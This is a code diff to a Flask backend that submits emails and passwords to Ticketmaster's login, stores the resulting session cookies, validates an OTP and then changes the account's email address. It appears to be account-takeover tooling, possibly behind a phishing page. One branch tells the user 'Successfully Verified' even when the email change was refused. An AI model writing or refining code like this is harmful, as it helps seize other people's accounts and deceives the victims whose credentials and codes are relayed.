@@ -54,13 +54,13 @@ def login_user(email, password):
     if "continueLink" in resp or "auth.ticketmaster.com/account" in resp:
         return session, {"status": "success", "message": "Login successful"},login_url, resp
     elif "The user is not found" in resp:
-        return None, {"status": "fail", "message": "Invalid email"},login_url
+        return None, {"status": "fail", "message": "Invalid email"},login_url, resp
     elif "Credentials mismatch" in resp:
-        return None, {"status": "fail", "message": "Invalid password"},login_url
+        return None, {"status": "fail", "message": "Invalid password"},login_url, resp
     elif "The account is locked" in resp:
-        return None, {"status": "fail", "message": "Account Locked"},login_url
+        return None, {"status": "fail", "message": "Account Locked"},login_url, resp
     else:
-        return None, {"status": "fail", "message": "Unknown Error"},login_url
+        return None, {"status": "fail", "message": "Unknown Error"},login_url, resp
 
 def store_session_data(email, session, otp_link=None, client_token=None, account_age=None):
     # Parse cookies and headers from the session
@@ -109,6 +109,10 @@ def login():
     # Call the internal method to process the login
     session, result, login_url, resp = login_user(email, password)
     print(result)
+    print('return if fail')
+    if 'fail' in result['status']:
+        return jsonify(result), 400
+
 
     code = tm.parse_code(resp)
     device = tm.generate_device_string()
@@ -164,7 +168,13 @@ def otp_validate():
     verified_device_token = json.loads(resp)['verifiedDeviceToken']
     email = get_email()
     session, resp = tm.update_email(session, email, verified_device_token)
+
     print(resp)
+    if ('OTP validation failed' in resp):
+        #wrong OTP code
+        return jsonify({"status": "fail", "message": "Invalid OTP. Please try again"}), 400
+    elif ('Update is too soon' in resp):
+        return jsonify({"status": "success", "message": "Successfully Verified"}), 400
     # Return the result as a JSON response
     return jsonify(resp), 200
 if __name__ == '__main__':
